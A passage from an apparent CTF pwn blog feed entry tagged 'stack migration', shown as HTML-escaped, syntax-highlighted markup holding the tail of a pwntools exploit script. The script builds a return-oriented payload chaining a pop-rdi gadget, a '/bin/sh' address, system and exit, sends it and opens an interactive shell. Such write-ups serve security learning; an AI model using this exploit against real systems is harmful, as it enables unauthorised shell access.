data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ready&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; offset &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ret&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;prdi&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bs_a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys_a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;exit_a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
         <category term="stack migration" />
         <updated>2023-08-26T10:49:26.000Z</updated>
     </entry>
